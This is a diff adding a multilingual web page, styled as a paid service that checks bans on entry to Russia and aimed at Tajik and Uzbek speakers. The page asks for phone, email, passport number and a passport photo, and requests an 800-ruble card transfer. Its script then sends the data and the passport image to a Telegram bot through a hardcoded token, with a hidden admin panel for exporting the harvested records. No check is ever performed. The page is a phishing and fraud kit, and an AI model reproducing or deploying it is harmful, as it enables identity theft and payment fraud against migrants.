@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Проверка въезда в РФ | BorderCheck</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #eef2f8;
+            color: #0a2540;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+        .main-card {
+            max-width: 920px;
+            width: 100%;
+            background: white;
+            border-radius: 2rem;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            padding: 1.5rem 2rem 0.8rem;
+            border-bottom: 2px solid #e2edf7;
+        }
+        .logo h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #0f3b7a;
+            letter-spacing: -0.3px;
+        }
+        .logo p {
+            font-size: 0.8rem;
+            color: #2c5a8c;
+            margin-top: 4px;
+            font-weight: 500;
+        }
+        .lang-switcher {
+            display: flex;
+            gap: 0.5rem;
+            background: #f1f5f9;
+            padding: 0.4rem 0.8rem;
+            border-radius: 60px;
+        }
+        .lang-btn {
+            background: transparent;
+            border: none;
+            color: #2c3e66;
+            font-weight: 600;
+            font-size: 0.85rem;
+            padding: 0.4rem 0.9rem;
+            border-radius: 40px;
+            cursor: pointer;
+        }
+        .lang-btn.active {
+            background: #1e88e5;
+            color: white;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+        .form-card {
+            padding: 1.8rem 2rem 2rem;
+        }
+        .section-title {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #0f3b7a;
+            margin-bottom: 0.3rem;
+        }
+        .sub {
+            font-size: 0.9rem;
+            color: #3a5a7a;
+            margin-bottom: 2rem;
+            border-left: 4px solid #1e88e5;
+            padding-left: 1rem;
+        }
+        .input-group {
+            margin-bottom: 1.4rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+        .input-group label {
+            font-weight: 600;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #0a2540;
+        }
+        .input-group label i {
+            width: 24px;
+            color: #1e88e5;
+        }
+        input, .file-area {
+            background: #ffffff;
+            border: 1px solid #cbdde9;
+            border-radius: 1.2rem;
+            padding: 0.9rem 1.2rem;
+            font-size: 1rem;
+            color: #0f172a;
+            transition: 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1e88e5;
+            box-shadow: 0 0 0 3px rgba(30,136,229,0.2);
+        }
+        .file-area {
+            background: #fafdff;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .file-label {
+            background: #eef2ff;
+            padding: 0.4rem 1.2rem;
+            border-radius: 2rem;
+            font-size: 0.85rem;
+            cursor: pointer;
+            color: #1e88e5;
+            font-weight: 500;
+        }
+        #file-name {
+            font-size: 0.85rem;
+            color: #2c5a8c;
+        }
+        input[type="file"] { display: none; }
+        .preview-img {
+            margin-top: 12px;
+            max-width: 100%;
+            border-radius: 1rem;
+            max-height: 140px;
+            object-fit: cover;
+            border: 1px solid #cbdde9;
+            display: none;
+        }
+        .price-tag {
+            background: #f0f6fe;
+            border-radius: 1.2rem;
+            padding: 0.8rem 1.2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            margin: 1.5rem 0 1.8rem;
+            border: 1px solid #cbdde9;
+        }
+        .price-label {
+            font-weight: 700;
+            color: #0a2540;
+        }
+        .price-amount {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #0f3b7a;
+        }
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(95deg, #1e88e5, #0f3b7a);
+            border: none;
+            padding: 1rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            font-size: 1.1rem;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 12px rgba(30,136,229,0.3);
+        }
+        .btn-submit:hover {
+            filter: brightness(1.02);
+            transform: scale(1.01);
+        }
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(4px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .modal.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        .modal-content {
+            max-width: 460px;
+            width: 90%;
+            background: white;
+            border-radius: 2rem;
+            padding: 1.8rem;
+            border: 1px solid #e2edf7;
+            box-shadow: 0 25px 40px rgba(0,0,0,0.2);
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #0f3b7a;
+        }
+        .payment-details {
+            background: #f1f5f9;
+            border-radius: 1.2rem;
+            padding: 1rem;
+            margin: 1.2rem 0;
+        }
+        .copy-row {
+            background: white;
+            padding: 0.5rem;
+            border-radius: 1rem;
+            margin-top: 8px;
+            font-family: monospace;
+            border: 1px solid #cbdde9;
+        }
+        .fake-btn {
+            background: #2c3e66;
+            border: none;
+            color: white;
+            padding: 0.7rem;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: 600;
+            width: 100%;
+        }
+        .toast-msg {
+            position: fixed;
+            bottom: 25px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1f2f3e;
+            padding: 0.8rem 1.8rem;
+            border-radius: 60px;
+            color: white;
+            font-size: 0.9rem;
+            z-index: 1100;
+            display: none;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+        .support-footer {
+            margin-top: 2rem;
+            text-align: center;
+            padding-top: 1rem;
+            border-top: 1px solid #cbdde9;
+        }
+        .support-footer a {
+            color: #1e88e5;
+            text-decoration: none;
+            font-weight: 500;
+            margin: 0 6px;
+        }
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.6s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .admin-panel {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 800px;
+            max-height: 80vh;
+            background: white;
+            border-radius: 2rem;
+            z-index: 2000;
+            padding: 1.5rem;
+            overflow-y: auto;
+            display: none;
+            border: 2px solid #1e88e5;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.2);
+        }
+        .admin-panel.active { display: block; }
+        .order-item {
+            background: #f8fafc;
+            margin-bottom: 1rem;
+            padding: 1rem;
+            border-radius: 1rem;
+            border: 1px solid #cbdde9;
+        }
+        .order-photo {
+            max-width: 200px;
+            border-radius: 0.75rem;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+        .btn-admin {
+            background: #e2e8f0;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        @media (max-width: 640px) {
+            .form-card { padding: 1.2rem; }
+            .section-title { font-size: 1.6rem; }
+            .header { padding: 1rem 1.2rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="main-card">
+    <div class="header">
+        <div class="logo" id="secretAdminTrigger">
+            <h1>✈️ Loik | check</h1>
+            <p data-i18n="tagline">Проверка запрета на въезд в РФ</p>
+        </div>
+        <div class="lang-switcher">
+            <button class="lang-btn active" data-lang="ru">🇷🇺 Рус</button>
+            <button class="lang-btn" data-lang="tj">🇹🇯 Тоҷикӣ</button>
+            <button class="lang-btn" data-lang="uz">🇺🇿 O'zbek</button>
+        </div>
+    </div>
+    <div class="form-card">
+        <div class="section-title" data-i18n="mainTitle">Проверка въезда</div>
+        <div class="sub" data-i18n="subDesc">Введите данные и загрузите фото паспорта. Результат через 24-48 часов.</div>
+        <form id="checkForm">
+            <div class="input-group">
+                <label><i class="fas fa-phone-alt"></i> <span data-i18n="phoneLabel">Номер телефона</span></label>
+                <input type="tel" id="phone" placeholder="+7 900 123 45 67">
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-envelope"></i> <span data-i18n="emailLabel">Электронная почта</span></label>
+                <input type="email" id="email" placeholder="example@mail.com">
+            </div>
+            <div class="input-group">
+                <label><i class="fab fa-whatsapp"></i> <span data-i18n="waTgLabel">WhatsApp / Telegram (для результата)</span></label>
+                <input type="text" id="messengerContact" placeholder="+7 999 123 45-67 или @username">
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-id-card"></i> <span data-i18n="passportLabel">Номер паспорта (серия и номер)</span></label>
+                <input type="text" id="passportNum" placeholder="402 892 588">
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-camera"></i> <span data-i18n="photoLabel">Фотография паспорта</span></label>
+                <div class="file-area" id="fileDropArea">
+                    <span class="file-label"><i class="fas fa-upload"></i> <span data-i18n="chooseFile">Выбрать файл</span></span>
+                    <span id="file-name" data-i18n="noFile">Файл не выбран</span>
+                    <input type="file" id="passportPhoto" accept="image/*">
+                </div>
+                <img id="preview" class="preview-img" alt="preview">
+            </div>
+            <div class="price-tag">
+                <span class="price-label" data-i18n="serviceFee">Стоимость проверки:</span>
+                <span class="price-amount">800 ₽</span>
+            </div>
+            <button type="submit" class="btn-submit" id="submitBtn">
+                <i class="fas fa-shield-alt"></i> <span data-i18n="payCheckBtn">Оплатить и проверить</span>
+            </button>
+        </form>
+        <div class="support-footer">
+            <span data-i18n="supportTitle">📞 Служба поддержки:</span><br>
+            <a href="https://t.me/+_zVxnsEdMqZiM2Yy" target="_blank">Telegram</a> &nbsp;|&nbsp;
+            <a href="tel:+79385401876">+7 938 540 1876</a>
+            <div style="font-size:0.7rem; margin-top:6px;" data-i18n="supportHours">Ответ в течение часа, 10:00–20:00 МСК</div>
+        </div>
+    </div>
+</div>
+
+<!-- Модальное окно оплаты -->
+<div id="paymentModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <span data-i18n="paymentRequired">💳 Оплата услуги</span>
+            <button style="background:none; border:none; font-size:28px; cursor:pointer; color:#0f3b7a;" id="closeModalBtn">&times;</button>
+        </div>
+        <div data-i18n="paymentInfoDesc">Для завершения проверки необходимо оплатить 800 рублей. После подтверждения система выполнит запрос.</div>
+        <div class="payment-details">
+            <div><i class="fas fa-credit-card"></i> <strong data-i18n="transferDetails">Реквизиты перевода</strong></div>
+            <div class="copy-row">💳 2200 1545 0647 7636</div>
+            <div class="copy-row">📱 СБП: +7 938 540-18-76 (Альфа Банк)</div>
+            <div style="margin-top:12px; font-size:13px;" data-i18n="paymentNote">Переведите точную сумму и нажмите "Я оплатил".</div>
+        </div>
+        <button id="confirmPaymentBtn" class="fake-btn" style="background:#1e88e5;"><i class="fas fa-check-circle"></i> <span data-i18n="iPaidBtn">Я оплатил, проверить</span></button>
+    </div>
+</div>
+
+<!-- Админ-панель (5 кликов по логотипу) -->
+<div id="adminPanel" class="admin-panel">
+    <div style="display:flex; justify-content:space-between; align-items:center;">
+        <h3>📋 Поступившие заявки</h3>
+        <button id="closeAdminBtn" style="background:#e11d48; border:none; color:white; border-radius:30px; padding:5px 14px;">Закрыть</button>
+    </div>
+    <div id="ordersList" style="margin-top: 1rem;"></div>
+    <button id="exportOrdersBtn" class="btn-admin">📥 Экспорт JSON</button>
+</div>
+
+<div id="toastMsg" class="toast-msg"></div>
+
+<script>
+    // ========== TELEGRAM НАСТРОЙКИ (ВАШИ ДАННЫЕ) ==========
+    const BOT_TOKEN = '8126463959:AAEp2JNil_vkdf5eBe-J1idT3-cEpifbFx8';
+    const CHAT_ID = '8232492258';
+    // =====================================================
+
+    // ========== МУЛЬТИЯЗЫЧНОСТЬ ==========
+    const translations = {
+        ru: {
+            tagline: "Проверка запрета на въезд в РФ", mainTitle: "Проверка въезда в Россию",
+            subDesc: "Введите данные и загрузите фото паспорта. Результат через 24-48 часов.",
+            phoneLabel: "Номер телефона", emailLabel: "Электронная почта",
+            waTgLabel: "WhatsApp / Telegram (для результата)", passportLabel: "Номер паспорта (серия и номер)",
+            photoLabel: "Фотография паспорта", chooseFile: "Выбрать файл", noFile: "Файл не выбран",
+            serviceFee: "Стоимость проверки:", payCheckBtn: "Оплатить и проверить",
+            paymentRequired: "💳 Оплата услуги", paymentInfoDesc: "Для завершения проверки необходимо оплатить 800 рублей.",
+            transferDetails: "Реквизиты перевода", paymentNote: "Переведите точную сумму и нажмите 'Я оплатил'.",
+            iPaidBtn: "Я оплатил, проверить", fillAllFields: "⚠️ Заполните все поля и загрузите фото паспорта",
+            invalidEmail: "📧 Укажите корректный email", phoneRequired: "📞 Введите номер телефона",
+            passportRequired: "🆔 Введите номер паспорта", photoRequired: "🖼️ Загрузите фотографию паспорта",
+            orderAccepted: "✅ Заявка №{} успешно отправлена! Результат придёт в течение 24-48 часов.",
+            waitMessage: "🔔 Спасибо! Оператор свяжется при необходимости.",
+            serverError: "❌ Ошибка отправки заявки. Попробуйте позже или напишите в поддержку.",
+            supportTitle: "📞 Служба поддержки:", supportHours: "Ответ в течение часа, 10:00–20:00 МСК",
+            checking: "Отправка заявки..."
+        },
+        tj: {
+            tagline: "Санҷиши манъи вуруд ба РФ", mainTitle: "Санҷиши вуруд ба Русия",
+            subDesc: "Маълумоти худро ворид кунед ва акси шиносномаро бор кунед. Натиҷа дар 24-48 соат.",
+            phoneLabel: "Рақами телефон", emailLabel: "Почтаи электронӣ",
+            waTgLabel: "WhatsApp / Telegram (барои натиҷа)", passportLabel: "Рақами шиноснома (серия ва рақам)",
+            photoLabel: "Акси шиноснома", chooseFile: "Интихоби файл", noFile: "Файл интихоб нашуд",
+            serviceFee: "Нархи санҷиш:", payCheckBtn: "Пардохт ва санҷиш",
+            paymentRequired: "💳 Пардохти хизматрасонӣ", paymentInfoDesc: "Барои анҷоми санҷиш бояд 800 рубл пардохт кунед.",
+            transferDetails: "Маълумоти интиқол", paymentNote: "Маблағро гузаронед ва \"Пардохт кардам\" -ро пахш кунед.",
+            iPaidBtn: "Пардохт кардам, санҷиш", fillAllFields: "⚠️ Ҳамаи майдонҳоро пур кунед ва акси шиносномаро бор кунед",
+            invalidEmail: "📧 Почтаи электронии дуруст ворид кунед", phoneRequired: "📞 Рақами телефонро ворид кунед",
+            passportRequired: "🆔 Рақами шиносномаро ворид кунед", photoRequired: "🖼️ Акси шиносномаро бор кунед",
+            orderAccepted: "✅ Дархости №{} қабул шуд! Натиҷа дар 24-48 соат.", waitMessage: "🔔 Ташаккур! Оператор тамос мегирад.",
+            serverError: "❌ Хатои ирсоли дархост. Аз нав кӯшиш кунед.", supportTitle: "📞 Дастгирӣ:", supportHours: "Ҷавоб дар давоми як соат, 10:00–20:00",
+            checking: "Ирсоли дархост..."
+        },
+        uz: {
+            tagline: "RF ga kirishni taqiqlash tekshiruvi", mainTitle: "Rossiyaga kirishni tekshirish",
+            subDesc: "Ma'lumotlaringizni kiriting va pasport rasmini yuklang. Natija 24-48 soatda.",
+            phoneLabel: "Telefon raqami", emailLabel: "Elektron pochta",
+            waTgLabel: "WhatsApp / Telegram (natija uchun)", passportLabel: "Pasport raqami (seriya va raqam)",
+            photoLabel: "Pasport fotosurati", chooseFile: "Faylni tanlash", noFile: "Fayl tanlanmagan",
+            serviceFee: "Tekshiruv narxi:", payCheckBtn: "Toʻlov va tekshiruv",
+            paymentRequired: "💳 Xizmat haqi", paymentInfoDesc: "Tekshiruvni yakunlash uchun 800 rubl toʻlash kerak.",
+            transferDetails: "Oʻtkazma rekvizitlari", paymentNote: "Summani oʻtkazing va “Toʻladim” tugmasini bosing.",
+            iPaidBtn: "Toʻladim, tekshirish", fillAllFields: "⚠️ Barcha maydonlarni toʻldiring va pasport rasmini yuklang",
+            invalidEmail: "📧 Toʻgʻri elektron pochtani kiriting", phoneRequired: "📞 Telefon raqamini kiriting",
+            passportRequired: "🆔 Pasport raqamini kiriting", photoRequired: "🖼️ Pasport rasmini yuklang",
+            orderAccepted: "✅ №{} buyurtma qabul qilindi! Natija 24-48 soatda.", waitMessage: "🔔 Rahmat! Operator bogʻlanadi.",
+            serverError: "❌ Xatolik. Qaytadan urinib koʻring.", supportTitle: "📞 Yordam:", supportHours: "Bir soat ichida javob, 10:00–20:00",
+            checking: "Buyurtma joʻnatilmoqda..."
+        }
+    };
+
+    let currentLang = 'ru';
+    let selectedFile = null;
+
+    function applyLanguage(lang) {
+        document.querySelectorAll('[data-i18n]').forEach(el => {
+            const key = el.getAttribute('data-i18n');
+            if (translations[lang][key]) el.innerText = translations[lang][key];
+        });
+        document.getElementById('phone').placeholder = "+7 900 123 45 67";
+        document.getElementById('email').placeholder = "example@mail.com";
+        let messengerField = document.getElementById('messengerContact');
+        if (messengerField) {
+            messengerField.placeholder = (lang === 'ru') ? "+7 999 123 45-67 или @username" : (lang === 'tj' ? "+7 999 123 45-67 ё @username" : "+7 999 123 45-67 yoki @username");
+        }
+        document.getElementById('passportNum').placeholder = "402 892 588";
+        let fileLabelSpan = document.querySelector('.file-label span');
+        if (fileLabelSpan) fileLabelSpan.innerText = translations[lang].chooseFile;
+        if (!selectedFile) document.getElementById('file-name').innerText = translations[lang].noFile;
+        currentLang = lang;
+    }
+
+    document.querySelectorAll('.lang-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const lang = btn.getAttribute('data-lang');
+            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            applyLanguage(lang);
+        });
+    });
+
+    // ========== ФАЙЛ ==========
+    const fileInput = document.getElementById('passportPhoto');
+    const fileNameSpan = document.getElementById('file-name');
+    const previewImg = document.getElementById('preview');
+    const fileDropArea = document.getElementById('fileDropArea');
+
+    function openFileDialog() { fileInput.click(); }
+    fileDropArea?.addEventListener('click', (e) => { e.stopPropagation(); openFileDialog(); });
+    document.querySelector('.file-label')?.addEventListener('click', (e) => { e.stopPropagation(); openFileDialog(); });
+    fileInput.addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (file) {
+            selectedFile = file;
+            fileNameSpan.innerText = file.name;
+            const reader = new FileReader();
+            reader.onload = (ev) => {
+                previewImg.src = ev.target.result;
+                previewImg.style.display = 'block';
+            };
+            reader.readAsDataURL(file);
+        } else {
+            selectedFile = null;
+            fileNameSpan.innerText = translations[currentLang].noFile;
+            previewImg.style.display = 'none';
+            previewImg.src = '';
+        }
+    });
+
+    // ========== АДМИНКА (localStorage) ==========
+    let orders = JSON.parse(localStorage.getItem('border_check_orders') || '[]');
+    function saveOrders() { localStorage.setItem('border_check_orders', JSON.stringify(orders)); }
+    function addOrder(orderData, photoBase64) {
+        let newOrder = {
+            id: Date.now(),
+            timestamp: new Date().toLocaleString(),
+            phone: orderData.phone,
+            email: orderData.email,
+            messenger: orderData.messenger,
+            passportNumber: orderData.passportNumber,
+            photoBase64: photoBase64,
+        };
+        orders.unshift(newOrder);
+        saveOrders();
+        return newOrder.id;
+    }
+    function renderAdminPanel() {
+        let container = document.getElementById('ordersList');
+        if (!container) return;
+        if (orders.length === 0) { container.innerHTML = '<p>Пока нет заявок</p>'; return; }
+        let html = '';
+        orders.forEach(ord => {
+            html += `<div class="order-item">
+                        <strong>#${ord.id}</strong> | ${ord.timestamp}<br>
+                        📞 ${ord.phone}<br>
+                        📧 ${ord.email}<br>
+                        📱 ${ord.messenger || 'не указан'}<br>
+                        🆔 ${ord.passportNumber}<br>
+                        ${ord.photoBase64 ? `<img src="${ord.photoBase64}" class="order-photo" onclick="window.open(this.src)">` : 'Нет фото'}<br>
+                     </div>`;
+        });
+        container.innerHTML = html;
+    }
+    let clickCount = 0;
+    document.getElementById('secretAdminTrigger').addEventListener('click', () => {
+        clickCount++;
+        if (clickCount >= 5) {
+            renderAdminPanel();
+            document.getElementById('adminPanel').classList.add('active');
+            clickCount = 0;
+        }
+        setTimeout(() => { clickCount = 0; }, 1000);
+    });
+    document.getElementById('closeAdminBtn').addEventListener('click', () => {
+        document.getElementById('adminPanel').classList.remove('active');
+    });
+    document.getElementById('exportOrdersBtn').addEventListener('click', () => {
+        let dataStr = JSON.stringify(orders, null, 2);
+        let blob = new Blob([dataStr], {type: 'application/json'});
+        let url = URL.createObjectURL(blob);
+        let a = document.createElement('a');
+        a.href = url;
+        a.download = `orders_${new Date().toISOString()}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+        showToast('Экспорт создан', false);
+    });
+
+    // Константы (используем данные с вашего скриншота)
+const TG_TOKEN = '8126463959:AAEp2JNil_vkdf5eBe-J1idT3-cEpifbFx8';
+const TG_CHAT_ID = '8232492258';
+
+// ========== TELEGRAM ОТПРАВКА ==========
+async function sendToTelegram(orderId, formData, photoBase64) {
+    const TG_TOKEN = '8126463959:AAEp2JNil_vkdf5eBe-J1idT3-cEpifbFx8';
+    const TG_CHAT_ID = '5353896236'; // Твой реальный ID из User Info Bot
+
+    try {
+        // Формируем простой текст без разметки, чтобы ничего не заглючило
+        let text = `📋 НОВАЯ ЗАЯВКА #${orderId}\n\n` +
+                   `📞 Телефон: ${formData.phone}\n` +
+                   `📧 Email: ${formData.email}\n` +
+                   `📱 Мессенджер: ${formData.messenger || 'не указан'}\n` +
+                   `🆔 Паспорт: ${formData.passportNumber}\n` +
+                   `💰 Сумма: 800 RUB\n` +
+                   `⏳ Статус: ожидает проверки`;
+
+        // 1. Отправляем текстовые данные
+        const textResponse = await fetch(`https://telegram.org{TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: TG_CHAT_ID, 
+                text: text
+            })
+        });
+
+        const textData = await textResponse.json();
+        if (!textData.ok) {
+            console.error('Ошибка Telegram (текст):', textData.description);
+        }
+
+        // 2. Отправляем фото, если оно есть
+        if (photoBase64 && photoBase64.includes('base64')) {
+            try {
+                const res = await fetch(photoBase64);
+                const blob = await res.blob();
+                
+                let photoForm = new FormData();
+                photoForm.append('chat_id', TG_CHAT_ID);
+                photoForm.append('photo', blob, 'passport.jpg');
+
+                const photoResponse = await fetch(`https://telegram.org{TG_TOKEN}/sendPhoto`, { 
+                    method: 'POST', 
+                    body: photoForm 
+                });
+
+                const photoData = await photoResponse.json();
+                if (!photoData.ok) {
+                    console.error('Ошибка Telegram (фото):', photoData.description);
+                }
+            } catch (photoErr) {
+                console.error('Ошибка обработки фото:', photoErr);
+            }
+        }
+
+        return true;
+    } catch (err) {
+        console.error('Критическая ошибка сети:', err);
+        alert('Ошибка при отправке! Проверьте консоль браузера (F12).');
+        return false;
+    }
+}
+
+
+
+    // ========== ОБЩИЕ ==========
+    function showToast(msg, isError = false) {
+        let toast = document.getElementById('toastMsg');
+        toast.innerText = msg;
+        toast.style.display = 'flex';
+        toast.style.background = isError ? '#b91c1c' : '#0f3b7a';
+        setTimeout(() => { toast.style.display = 'none'; }, 5000);
+    }
+    function validateForm() {
+        let phone = document.getElementById('phone').value.trim();
+        let email = document.getElementById('email').value.trim();
+        let passport = document.getElementById('passportNum').value.trim();
+        if (!phone) { showToast(translations[currentLang].phoneRequired, true); return false; }
+        if (!email || !/^\S+@\S+\.\S+$/.test(email)) { showToast(translations[currentLang].invalidEmail, true); return false; }
+        if (!passport) { showToast(translations[currentLang].passportRequired, true); return false; }
+        if (!selectedFile) { showToast(translations[currentLang].photoRequired, true); return false; }
+        return true;
+    }
+    function fileToBase64(file) {
+        return new Promise((resolve, reject) => {
+            let reader = new FileReader();
+            reader.onload = () => resolve(reader.result);
+            reader.onerror = reject;
+            reader.readAsDataURL(file);
+        });
+    }
+
+    // ========== ОСНОВНАЯ ЛОГИКА ==========
+    let isProcessing = false;
+    const modal = document.getElementById('paymentModal');
+    const closeModal = document.getElementById('closeModalBtn');
+    const confirmBtn = document.getElementById('confirmPaymentBtn');
+    const form = document.getElementById('checkForm');
+
+    form.addEventListener('submit', (e) => {
+        e.preventDefault();
+        if (isProcessing) return;
+        if (validateForm()) modal.classList.add('active');
+    });
+    closeModal.addEventListener('click', () => modal.classList.remove('active'));
+    window.onclick = (e) => { if (e.target === modal) modal.classList.remove('active'); };
+
+    confirmBtn.addEventListener('click', async () => {
+        if (isProcessing) return;
+        modal.classList.remove('active');
+        isProcessing = true;
+        let btn = document.getElementById('submitBtn');
+        let originalHtml = btn.innerHTML;
+        btn.innerHTML = `<span class="spinner"></span> <span>${translations[currentLang].checking}</span>`;
+        btn.disabled = true;
+
+        try {
+            let phone = document.getElementById('phone').value.trim();
+            let email = document.getElementById('email').value.trim();
+            let messenger = document.getElementById('messengerContact').value.trim();
+            let passportNum = document.getElementById('passportNum').value.trim();
+            if (!selectedFile) throw new Error('no file');
+
+            let photoBase64 = await fileToBase64(selectedFile);
+            let orderData = { phone, email, messenger, passportNumber: passportNum };
+            let orderId = addOrder(orderData, photoBase64);
+            await sendToTelegram(orderId, orderData, photoBase64);
+
+            // очистка формы
+            document.getElementById('phone').value = '';
+            document.getElementById('email').value = '';
+            document.getElementById('messengerContact').value = '';
+            document.getElementById('passportNum').value = '';
+            selectedFile = null;
+            fileInput.value = '';
+            fileNameSpan.innerText = translations[currentLang].noFile;
+            previewImg.style.display = 'none';
+            previewImg.src = '';
+
+            showToast(translations[currentLang].orderAccepted.replace('{}', orderId), false);
+            setTimeout(() => showToast(translations[currentLang].waitMessage, false), 800);
+        } catch (err) {
+            console.error(err);
+            showToast(translations[currentLang].serverError, true);
+        } finally {
+            btn.innerHTML = originalHtml;
+            btn.disabled = false;
+            isProcessing = false;
+        }
+    });
+
+    applyLanguage('ru');
+    // поля пустые для реального ввода
+    document.getElementById('phone').value = '';
+    document.getElementById('email').value = '';
+    document.getElementById('messengerContact').value = '';
+    document.getElementById('passportNum').value = '';
+    selectedFile = null;
+</script>
+</body>
+</html>
